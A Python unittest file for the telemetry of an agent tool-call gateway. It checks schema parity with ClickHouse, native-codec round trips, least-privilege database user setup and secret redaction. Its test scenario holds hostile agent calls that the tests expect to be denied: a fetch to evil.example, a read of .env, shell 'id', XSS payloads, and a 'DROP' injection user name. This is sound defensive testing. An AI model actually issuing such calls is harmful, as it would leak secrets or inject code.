"""Telemetry contract tests (stdlib unittest; run by harness.py).

Offline, always:
- telemetry/schema.sql columns == EVENT_COLUMNS (names, order) and == SPEC.md 5.1 (types);
  the user/grant section is comments only; the dashboard SQL is SPEC.md 5.4, parameterized.
- Events from a REAL Gateway (real gate, real file I/O, JsonlWriter) carry exactly
  EVENT_COLUMNS with values that fit the column types, proven by encoding them with
  clickhouse-connect's own Native insert codec for the schema's types and decoding them
  back (client-side only; no server involved). A negative control shows the round trip
  catches a value outside an Enum8.
- ClickHouseWriter's insert call shape, against a FAKE client that only records the call.
- scripts/setup_clickhouse.py refuses missing/invalid configuration (exit 2) without
  printing credential values.

Live, only when .env has CLICKHOUSE_HOST and admin credentials (otherwise SKIPPED with the
reason): `scripts/setup_clickhouse.py --check` against the real server.
"""

from __future__ import annotations

import importlib.util
import io
import json
import os
import re
import subprocess
import sys
import tempfile
import unittest
import uuid
from contextlib import redirect_stdout
from datetime import datetime, timezone
from pathlib import Path
from unittest import mock

REPO_ROOT = Path(__file__).resolve().parents[1]
if str(REPO_ROOT) not in sys.path:
    sys.path.insert(0, str(REPO_ROOT))

from hold.core import (  # noqa: E402
    BUGGY_APP, EVENT_COLUMNS, FIXED_APP, ClickHouseWriter, Gateway, IntentReceipt, JsonlWriter, Telemetry,
)
from hold.env import load_env  # noqa: E402
from telemetry import clickhouse as tch  # noqa: E402

SETUP_SCRIPT = REPO_ROOT / "scripts" / "setup_clickhouse.py"
TASK = "hold-telemetry-test"
OTHER_TASK = "hold-telemetry-other"
PAYLOAD_PATH = "<img src=x onerror=alert(1)>"
PAYLOAD_TOOL = "<script>alert('hold')</script>"
SINKS = {"FS_READ", "FS_WRITE", "NETWORK_EGRESS", "SHELL_EXEC", "GIT_MUTATION", "UNKNOWN_TOOL", "UNKNOWN"}
# Sentinels contain "not-a-real-secret" so the repo's secret hook accepts them.
SENTINEL_PASSWORD = "not-a-real-secret-pw-7Q"

# (tool, args, expected decision, expected exec_status) for TASK, in call order.
SCENARIO = [
    ("read_file", {"path": "src/flask/app.py"}, "ALLOW", "ok"),
    ("read_file", {"path": "ISSUE.md"}, "ALLOW", "ok"),
    ("read_file", {"path": ".env"}, "DENY", "not_run"),
    ("fetch_url", {"url": "https://evil.example/collect?k=v"}, "DENY", "not_run"),
    ("bash_exec", {"command": "id"}, "DENY", "not_run"),
    ("read_file", {"path": PAYLOAD_PATH}, "DENY", "not_run"),
    (PAYLOAD_TOOL, {}, "DENY", "not_run"),
    ("write_file", {"path": "src/flask/app.py", "content": FIXED_APP}, "ALLOW", "ok"),
    ("read_file", {"path": "src/flask/missing.py"}, "ALLOW", "error"),
]


def gateway_scenario(base: Path):
    """Run SCENARIO (plus one call under OTHER_TASK) through real Gateways writing to a real
    JSONL audit log. Returns (audit_path, captured_events, dispatched_urls). The capture
    writer only keeps the in-memory event dicts so their Python types can be checked."""
    ws = base / "workspace"
    (ws / "src" / "flask").mkdir(parents=True)
    (ws / "src" / "flask" / "app.py").write_bytes(BUGGY_APP.encode("utf-8"))
    (ws / "ISSUE.md").write_text("get_user_name crashes on None.\n", encoding="utf-8")
    (ws / ".env").write_text("FAKE_TOKEN=not-a-real-secret\n", encoding="utf-8")
    audit = base / "audit.jsonl"
    captured: list = []
    dispatched: list = []

    def http_open(url: str) -> str:  # records dispatches; every fetch here must be denied
        dispatched.append(url)
        return ""

    telemetry = Telemetry([JsonlWriter(audit), captured.extend], flush_interval=0.01)

    def receipt(task_id: str) -> IntentReceipt:
        return IntentReceipt.from_dict({
            "task_id": task_id, "intent": "fix app.py", "workspace_root": "workspace",
            "capabilities": {"read": ["src/**", "ISSUE.md"], "write": ["src/flask/app.py"],
                             "network_egress": False, "host_allowlist": []},
        }, base)

    hold = Gateway(receipt(TASK), telemetry, http_open=http_open)
    for tool, args, _, _ in SCENARIO:
        hold.call(tool, args, request_id=f"req-{tool[:10]}")
    Gateway(receipt(OTHER_TASK), telemetry, http_open=http_open).call("read_file", {"path": ".env"})
    telemetry.close()
    return audit, captured, dispatched


def load_setup_module():
    name = "hold_setup_clickhouse"
    if name not in sys.modules:
        spec = importlib.util.spec_from_file_location(name, SETUP_SCRIPT)
        module = importlib.util.module_from_spec(spec)
        sys.modules[name] = module  # dataclasses resolve annotations through sys.modules
        spec.loader.exec_module(module)
    return sys.modules[name]


class FakeError(Exception):
    def __init__(self, message, code, name):
        super().__init__(message)
        self.code, self.name = code, name


class FakeResult:
    def __init__(self, columns, rows):
        self.column_names, self.result_rows = columns, rows

    def named_results(self):
        return (dict(zip(self.column_names, row)) for row in self.result_rows)


class FakeServer:
    """FAKE in-memory stand-in for ClickHouse. It exists only to exercise
    scripts/setup_clickhouse.py's control flow and to record the exact SQL text
    clickhouse-connect would send (bound with the library's real bind_query). It proves
    nothing about ClickHouse itself; LiveClickHouse does that."""

    def __init__(self, existing_users=(), reader_can_insert=False):
        self.rows, self.sql = [], []
        self.users = set(existing_users)
        self.reader_can_insert = reader_can_insert

    def client(self, role):
        return FakeClient(self, role)


class FakeClient:
    server_version = "FAKE"

    def __init__(self, server, role):
        self.server, self.role, self.database = server, role, None

    def close(self):
        pass

    def _bind(self, sql, parameters):
        from clickhouse_connect.driver.binding import bind_query
        final, bound = bind_query(sql, parameters)
        self.server.sql.append((self.role, final))
        return final, {k[len("param_"):]: v for k, v in bound.items()}

    def command(self, sql, parameters=None, settings=None):
        final, _ = self._bind(sql, parameters)
        if final.startswith("EXISTS TABLE"):
            return 1
        if final.startswith(("DELETE FROM", "ALTER TABLE")):
            tasks = re.findall(r"'([^']*)'", final.split(" IN ", 1)[1])
            self.server.rows = [r for r in self.server.rows if r["task_id"] not in tasks]
        return ""

    def query(self, sql, parameters=None):
        final, params = self._bind(sql, parameters)
        if self.role == "writer":
            raise FakeError("Code: 497. Not enough privileges", 497, "ACCESS_DENIED")
        if "system.users" in final:
            return FakeResult(["count()"], [[int(params["name"] in self.server.users)]])
        if final.startswith("SHOW GRANTS"):
            return FakeResult(["grant"], [["GRANT (fake)"]])
        if final.startswith("DESCRIBE TABLE"):
            return FakeResult(["name", "type"], [list(c) for c in tch.schema_columns()])
        rows = [r for r in self.server.rows if r["task_id"] in params.values()]
        if final == tch.LIVE_FEED_SQL:
            return FakeResult(["ts", "decision", "gate_us"],
                              [[r["ts"], r["decision"], round(r["gate_latency_ns"] / 1000, 1)] for r in rows])
        if final == tch.SUMMARY_SQL:
            us = round(rows[0]["gate_latency_ns"] / 1000, 1)
            return FakeResult(["decision", "calls", "p50_us", "p95_us"], [[rows[0]["decision"], len(rows), us, us]])
        if final.startswith("SELECT toString(event_id)"):
            return FakeResult(["id", "d", "s", "k", "ns"], [[str(r["event_id"]), r["decision"], r["exec_status"],
                                                              r["sink"], r["gate_latency_ns"]] for r in rows])
        if final.startswith("SELECT count()"):
            return FakeResult(["count()"], [[len(rows)]])
        raise AssertionError(f"FAKE server got unexpected SQL: {final}")

    def insert(self, table, data, column_names=None, column_type_names=None):
        if self.role == "reader" and not self.server.reader_can_insert:
            raise FakeError("Code: 164. Cannot execute query in readonly mode", 164, "READONLY")
        self.server.rows.extend(dict(zip(column_names, row)) for row in data)


def native_roundtrip(rows):
    """Encode rows with clickhouse-connect's Native insert codec for the schema.sql column
    types, then decode them with its Native reader. Returns (insert_prefix, exception, rows)."""
    from clickhouse_connect.datatypes.registry import get_from_name
    from clickhouse_connect.driver import ctypes as cc_ctypes
    from clickhouse_connect.driver.insert import InsertContext
    from clickhouse_connect.driver.query import QueryContext
    from clickhouse_connect.driver.transform import NativeTransform

    columns = tch.schema_columns()
    context = InsertContext(tch.TABLE, [n for n, _ in columns], [get_from_name(t) for _, t in columns], data=rows)
    prefix, body = b"".join(NativeTransform.build_insert(context)).split(b"\n", 1)

    class _Bytes:  # the shape clickhouse-connect's ResponseBuffer reads from
        def __init__(self, data):
            self.gen = iter([data])

        def close(self):
            pass

    result = NativeTransform.parse_response(cc_ctypes.RespBuffCls(_Bytes(body)), QueryContext())
    return prefix, context.insert_exception, [tuple(r) for r in result.result_rows]


def _sql_blocks(section_heading: str):
    text = tch.SPEC_PATH.read_text(encoding="utf-8")
    section = re.search(rf"^{re.escape(section_heading)}[^\n]*\n(.*?)^#", text, re.MULTILINE | re.DOTALL)
    block = re.search(r"```sql\n(.*?)```", section.group(1), re.DOTALL)
    return tch.sql_statements(block.group(1))


def _squash(sql: str) -> str:
    return " ".join(sql.split())


class SchemaParity(unittest.TestCase):
    def test_schema_columns_equal_event_columns_in_order(self):
        self.assertEqual([name for name, _ in tch.schema_columns()], EVENT_COLUMNS)

    def test_schema_types_equal_spec_5_1(self):
        schema = [(n, tch.normalize_type(t)) for n, t in tch.schema_columns()]
        spec = [(n, tch.normalize_type(t)) for n, t in tch.spec_columns()]
        self.assertEqual(schema, spec)
        types = dict(tch.schema_columns())
        self.assertEqual(types["event_id"], "UUID")
        self.assertEqual(types["ts"], "DateTime64(6, 'UTC')")
        self.assertEqual(types["gate_latency_ns"], "UInt64")
        self.assertEqual(tch.enum_names(types["decision"]), ["ALLOW", "DENY"])
        self.assertEqual(tch.enum_names(types["exec_status"]), ["ok", "error", "not_run"])
        statement = tch.sql_statements(tch.SCHEMA_PATH.read_text(encoding="utf-8"))[0]
        self.assertIn("ENGINE = MergeTree", statement)
        self.assertIn("ORDER BY (task_id, ts)", statement)

    def test_schema_file_executes_only_the_create_table_and_holds_no_password(self):
        text = tch.SCHEMA_PATH.read_text(encoding="utf-8")
        statements = tch.sql_statements(text)
        self.assertEqual(len(statements), 1, statements)
        self.assertTrue(statements[0].startswith("CREATE TABLE IF NOT EXISTS hold_events"))
        self.assertIn("CREATE USER IF NOT EXISTS hold_writer", text)  # documented, as comments
        self.assertIn("GRANT SELECT ON default.hold_events TO hold_reader", text)
        for literal in re.findall(r"IDENTIFIED BY\s+'([^']*)'", text):
            self.assertEqual(literal, "<generated>")

    def test_dashboard_queries_are_spec_5_4_and_parameterized(self):
        live, summary = _sql_blocks("### 5.4")[:2]
        # The API allows limit <= 200, so the feed fetches 200 rows and slices in Python.
        self.assertEqual(_squash(tch.LIVE_FEED_SQL), _squash(live).replace("LIMIT 50", "LIMIT 200"))
        self.assertEqual(_squash(tch.SUMMARY_SQL), _squash(summary))
        for sql in (tch.LIVE_FEED_SQL, tch.SUMMARY_SQL):
            self.assertEqual(re.findall(r"\{[^}]*\}", sql), ["{task:String}"])
            self.assertNotIn("%", sql)


class GatewayEventsFitSchema(unittest.TestCase):
    @classmethod
    def setUpClass(cls):
        cls._tmp = tempfile.TemporaryDirectory()
        cls.started = datetime.now(timezone.utc)
        cls.audit, cls.events, cls.dispatched = gateway_scenario(Path(cls._tmp.name))
        cls.finished = datetime.now(timezone.utc)

    @classmethod
    def tearDownClass(cls):
        cls._tmp.cleanup()

    def test_scenario_produced_the_expected_real_decisions(self):
        ours = [e for e in self.events if e["task_id"] == TASK]
        self.assertEqual([(e["decision"], e["exec_status"]) for e in ours],
                         [(d, s) for _, _, d, s in SCENARIO])
        self.assertEqual(self.dispatched, [], "a denied fetch must never be dispatched")

    def test_events_have_exactly_event_columns(self):
        self.assertEqual(len(self.events), len(SCENARIO) + 1)
        for event in self.events:
            self.assertEqual(list(event), EVENT_COLUMNS)

    def test_values_fit_the_column_types(self):
        types = dict(tch.schema_columns())
        decisions, statuses = tch.enum_names(types["decision"]), tch.enum_names(types["exec_status"])
        for e in self.events:
            self.assertIsInstance(e["event_id"], uuid.UUID)
            self.assertEqual(e["event_id"].version, 4)
            self.assertIsInstance(e["ts"], datetime)
            self.assertIsNotNone(e["ts"].tzinfo, "a naive ts would be encoded as local time")
            self.assertEqual(e["ts"].utcoffset().total_seconds(), 0)
            self.assertTrue(self.started <= e["ts"] <= self.finished)
            self.assertIn(e["decision"], decisions)
            self.assertIn(e["exec_status"], statuses)
            self.assertIn(e["sink"], SINKS)
            self.assertIs(type(e["gate_latency_ns"]), int)
            self.assertTrue(0 < e["gate_latency_ns"] < 2 ** 64)
            for name in ("task_id", "agent_id", "request_id", "tool_name", "sink", "target", "reason",
                         "intent_digest"):
                self.assertIsInstance(e[name], str, name)
            self.assertRegex(e["intent_digest"], r"^[0-9a-f]{64}$")

    def test_clickhouse_native_codec_round_trips_every_event(self):
        rows = [[e[c] for c in EVENT_COLUMNS] for e in self.events]
        prefix, error, decoded = native_roundtrip(rows)
        self.assertIsNone(error)
        self.assertTrue(prefix.startswith(b"INSERT INTO hold_events (`event_id`, `ts`, `task_id`"), prefix)
        expected = []
        for e in self.events:
            row = [e[c] for c in EVENT_COLUMNS]
            row[EVENT_COLUMNS.index("ts")] = e["ts"].astimezone(timezone.utc).replace(tzinfo=None)
            expected.append(tuple(row))
        self.assertEqual(decoded, expected)
        targets = [r[EVENT_COLUMNS.index("target")] for r in decoded]
        self.assertIn(PAYLOAD_PATH, targets)
        self.assertIn(PAYLOAD_TOOL, targets)

    def test_negative_control_round_trip_catches_a_value_outside_the_enum(self):
        bad = dict(self.events[0], decision="MAYBE")
        _, _, decoded = native_roundtrip([[bad[c] for c in EVENT_COLUMNS]])
        # clickhouse-connect silently encodes an unknown Enum8 name as 0; decoding shows it.
        self.assertNotEqual(decoded[0][EVENT_COLUMNS.index("decision")], "MAYBE")

    def test_jsonl_audit_lines_carry_the_same_events(self):
        lines = [json.loads(line) for line in self.audit.read_text(encoding="utf-8").splitlines()]
        self.assertEqual(len(lines), len(self.events))
        for line, event in zip(lines, self.events):
            self.assertEqual(list(line), EVENT_COLUMNS)
            self.assertEqual(uuid.UUID(line["event_id"]), event["event_id"])
            self.assertEqual(datetime.fromisoformat(line["ts"]), event["ts"])
            self.assertEqual(line["gate_latency_ns"], event["gate_latency_ns"])
            self.assertEqual(line["target"], event["target"])


class ClickHouseWriterContract(unittest.TestCase):
    def test_writer_inserts_rows_in_event_columns_order(self):
        class FakeClient:
            """FAKE: records the insert call only. No ClickHouse involved."""

            def __init__(self):
                self.calls = []

            def insert(self, table, data, column_names=None):
                self.calls.append((table, data, column_names))

        with tempfile.TemporaryDirectory() as tmp:
            _, events, _ = gateway_scenario(Path(tmp))
        writer = ClickHouseWriter()
        writer._client = FakeClient()
        writer(events)
        (table, data, names), = writer._client.calls
        self.assertEqual(table, "hold_events")
        self.assertEqual(list(names), EVENT_COLUMNS)
        self.assertEqual(data, [[e[c] for c in EVENT_COLUMNS] for e in events])


def _script_env(**overrides):
    env = dict(os.environ)
    for name in [n for n in env if n.startswith("CLICKHOUSE_")]:
        del env[name]
    env.update({"CLICKHOUSE_HOST": "", "CLICKHOUSE_PORT": "", "CLICKHOUSE_SECURE": "", "CLICKHOUSE_DATABASE": "",
                "CLICKHOUSE_USER": "", "CLICKHOUSE_PASSWORD": "", "CLICKHOUSE_READER_USER": "",
                "CLICKHOUSE_READER_PASSWORD": "", "CLICKHOUSE_ADMIN_USER": "", "CLICKHOUSE_ADMIN_PASSWORD": ""})
    env.update(overrides)  # every var is set, so load_env cannot fill any from a real .env
    env["PYTHONIOENCODING"] = "utf-8"
    return env


def _complete_env(**overrides):
    values = {"CLICKHOUSE_HOST": "example.invalid", "CLICKHOUSE_PORT": "8443", "CLICKHOUSE_SECURE": "1",
              "CLICKHOUSE_DATABASE": "default", "CLICKHOUSE_USER": "hold_writer",
              "CLICKHOUSE_PASSWORD": SENTINEL_PASSWORD + "-w", "CLICKHOUSE_READER_USER": "hold_reader",
              "CLICKHOUSE_READER_PASSWORD": SENTINEL_PASSWORD + "-r", "CLICKHOUSE_ADMIN_USER": "default",
              "CLICKHOUSE_ADMIN_PASSWORD": SENTINEL_PASSWORD + "-a"}
    values.update(overrides)
    return _script_env(**values)


class SetupScriptOffline(unittest.TestCase):
    def run_setup(self, env, *args):
        return subprocess.run([sys.executable, str(SETUP_SCRIPT), *args], capture_output=True, text=True,
                              encoding="utf-8", env=env, cwd=str(REPO_ROOT), timeout=60)

    def assertNoSecrets(self, proc):
        self.assertNotIn(SENTINEL_PASSWORD, proc.stdout + proc.stderr)

    def test_missing_variables_exit_2_and_are_named(self):
        proc = self.run_setup(_script_env(CLICKHOUSE_ADMIN_PASSWORD=SENTINEL_PASSWORD), "--check")
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        for name in ("CLICKHOUSE_HOST", "CLICKHOUSE_ADMIN_USER", "CLICKHOUSE_USER", "CLICKHOUSE_PASSWORD",
                     "CLICKHOUSE_READER_USER", "CLICKHOUSE_READER_PASSWORD"):
            self.assertIn(name, proc.stderr)
        self.assertNotIn("CLICKHOUSE_ADMIN_PASSWORD,", proc.stderr)  # that one is set
        self.assertNoSecrets(proc)

    def test_url_as_host_is_refused_before_any_connection(self):
        proc = self.run_setup(_complete_env(CLICKHOUSE_HOST="https://abc.clickhouse.cloud:8443"))
        self.assertEqual(proc.returncode, 2, proc.stdout + proc.stderr)
        self.assertIn("bare hostname", proc.stderr)
        self.assertNoSecrets(proc)

    def test_writer_and_reader_must_be_dedicated_users(self):
        for overrides in ({"CLICKHOUSE_USER": "default", "CLICKHOUSE_ADMIN_USER": "admin"},
                          {"CLICKHOUSE_READER_USER": "hold_writer"},
                          {"CLICKHOUSE_USER": "bad name; DROP"}):
            proc = self.run_setup(_complete_env(**overrides), "--check")
            self.assertEqual(proc.returncode, 2, (overrides, proc.stdout, proc.stderr))
            self.assertIn("CONFIG ERROR", proc.stderr)
            self.assertNoSecrets(proc)

    def test_redactor_hides_raw_and_sql_escaped_password(self):
        password = SENTINEL_PASSWORD + "'x"
        redact = tch.Redactor({"CLICKHOUSE_PASSWORD": password, "CLICKHOUSE_USER": "hold_writer"})
        text = redact(f"Syntax error near IDENTIFIED BY '{password}' or '{password.replace(chr(39), chr(92) + chr(39))}'")
        self.assertNotIn(SENTINEL_PASSWORD, text)
        self.assertIn("<redacted>", text)
        self.assertIn("hold_writer", redact("user hold_writer"))  # user names are not secrets


class SetupScriptAgainstFakeServer(unittest.TestCase):
    """FAKE server (see FakeServer): control flow and SQL text of setup_clickhouse.py only."""

    PASSWORD = "not-a-real-secret-'q\\b"  # a quote and a backslash, to check literal escaping

    def setUp(self):
        self.setup = load_setup_module()
        self.cfg = self.setup.load_config(_complete_env(CLICKHOUSE_PASSWORD=self.PASSWORD))
        self.redact = tch.Redactor({"CLICKHOUSE_PASSWORD": self.PASSWORD,
                                    "CLICKHOUSE_READER_PASSWORD": self.cfg.reader_password})
        self.lines = []

    def out(self, message):
        self.lines.append(self.redact(message))

    def sql(self, server):
        return [text for _, text in server.sql]

    def test_setup_creates_table_and_least_privilege_users(self):
        server = FakeServer()
        self.setup.setup(self.cfg, server.client("admin"), self.out, self.redact)
        sql = self.sql(server)
        self.assertIn(tch.sql_statements(tch.SCHEMA_PATH.read_text(encoding="utf-8"))[0], sql)
        literal = "'" + self.PASSWORD.replace("\\", "\\\\").replace("'", "\\'") + "'"
        self.assertIn(f"CREATE USER IF NOT EXISTS `hold_writer` IDENTIFIED BY {literal}", sql)
        self.assertIn("GRANT INSERT ON `default`.`hold_events` TO `hold_writer`", sql)
        reader_create = [s for s in sql if s.startswith("CREATE USER IF NOT EXISTS `hold_reader`")]
        self.assertEqual(len(reader_create), 1)
        self.assertTrue(reader_create[0].endswith(" SETTINGS readonly = 1"))
        self.assertIn("GRANT SELECT ON `default`.`hold_events` TO `hold_reader`", sql)
        self.assertFalse(any(s.startswith(("REVOKE", "DROP")) for s in sql))
        self.assertNotIn("not-a-real-secret", "\n".join(self.lines))

    def test_setup_on_existing_users_resets_password_and_revokes_extra_rights(self):
        server = FakeServer(existing_users={"hold_writer", "hold_reader"})
        self.setup.setup(self.cfg, server.client("admin"), self.out, self.redact)
        sql = self.sql(server)
        self.assertTrue(any(s.startswith("ALTER USER `hold_writer` IDENTIFIED BY '") for s in sql))
        self.assertIn("REVOKE ALL ON *.* FROM `hold_writer`", sql)
        self.assertIn("REVOKE ALL ON *.* FROM `hold_reader`", sql)
        self.assertFalse(any(s.startswith("CREATE USER") for s in sql))

    def run_checks(self, server):
        def connect(endpoint, user, password, **kwargs):
            return server.client("reader" if user == self.cfg.reader_user else "writer")

        def writer_class():
            return lambda batch: server.client("writer").insert(
                "hold_events", [[e[c] for c in EVENT_COLUMNS] for e in batch], column_names=EVENT_COLUMNS)

        with mock.patch.object(self.setup.tch, "connect", connect), \
                mock.patch.object(self.setup, "ClickHouseWriter", writer_class), \
                redirect_stdout(io.StringIO()):
            return self.setup.run_checks(self.cfg, server.client("admin"), self.out, self.redact)

    def test_checks_pass_and_delete_the_probe_rows(self):
        server = FakeServer()
        self.assertTrue(self.run_checks(server), "\n".join(self.lines))
        self.assertEqual(self.lines[-1], "ALL CHECKS PASSED")
        self.assertEqual(sum(line.startswith("PASS") for line in self.lines), 8, "\n".join(self.lines))
        self.assertEqual(server.rows, [], "probe rows must be deleted")
        self.assertTrue(any(s.startswith("DELETE FROM `default`.`hold_events` WHERE task_id IN ('hold-setup-probe-")
                            for s in self.sql(server)))

    def test_checks_fail_when_the_reader_can_insert(self):
        server = FakeServer(reader_can_insert=True)
        self.assertFalse(self.run_checks(server))
        self.assertTrue(any(line.startswith("FAIL  reader 'hold_reader' cannot insert") for line in self.lines),
                        "\n".join(self.lines))
        self.assertEqual(server.rows, [], "probe rows are deleted even when a check fails")


class LiveClickHouse(unittest.TestCase):
    """Needs a real ClickHouse; skipped (never passed) when .env lacks the credentials."""

    def test_setup_check_against_live_clickhouse(self):
        loaded = load_env()
        try:
            absent = tch.missing(("CLICKHOUSE_HOST", "CLICKHOUSE_ADMIN_USER", "CLICKHOUSE_ADMIN_PASSWORD"))
        finally:
            for name in loaded:  # leave the harness process environment as it was
                os.environ.pop(name, None)
        if absent:
            self.skipTest("live ClickHouse not configured (missing or blank: " + ", ".join(absent)
                          + "); fill .env, run scripts/setup_clickhouse.py once, then re-run")
        proc = subprocess.run([sys.executable, str(SETUP_SCRIPT), "--check"], capture_output=True, text=True,
                              encoding="utf-8", cwd=str(REPO_ROOT), timeout=180)
        self.assertEqual(proc.returncode, 0, proc.stdout[-4000:] + proc.stderr[-2000:])
        self.assertIn("ALL CHECKS PASSED", proc.stdout)


if __name__ == "__main__":
    unittest.main()
